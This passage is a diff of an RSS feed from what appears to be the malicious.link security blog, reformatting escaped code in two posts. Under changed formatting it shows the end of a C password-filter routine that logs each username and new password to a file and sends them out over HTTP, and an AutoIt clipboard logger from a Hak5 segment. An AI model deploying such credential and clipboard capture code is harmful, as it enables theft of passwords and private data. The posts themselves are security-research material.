+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	fprintf(pFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%ws:%ws&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  fclose(pFile);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Length&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Length&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	HttpSendRequest(hReq,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,pBuf,strlen(pBuf));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -240,14 +240,14 @@ NTSTATUS &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;sp
       
       <guid>https://malicious.link/post/2011/2011-12-26-hak5-segment-sneak-peak/</guid>
       <description>&lt;p&gt;Since it&amp;rsquo;s Christmas and all, I thought I&amp;rsquo;d post the code snippet from my Hak5 segment a bit early:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#include &amp;lt;Clipboard.au3&amp;gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#include &amp;lt;Clipboard.au3&amp;gt;
 #include &amp;lt;File.au3&amp;gt;
-$oldclip = &amp;quot;&amp;quot;
+$oldclip = &amp;#34;&amp;#34;
 While 1
     $clip = _ClipBoard_GetData()
-    If $clip &amp;lt;&amp;gt; &amp;quot;0&amp;quot; Then
+    If $clip &amp;lt;&amp;gt; &amp;#34;0&amp;#34; Then
         If $clip &amp;lt;&amp;gt; $oldclip Then
-            _FileWriteLog(@UserProfileDir &amp;amp; &amp;quot;clip.log&amp;quot;, $clip)
+            _FileWriteLog(@UserProfileDir &amp;amp; &amp;#34;clip.log&amp;#34;, $clip)
             $oldclip = $clip
         EndIf
     EndIf
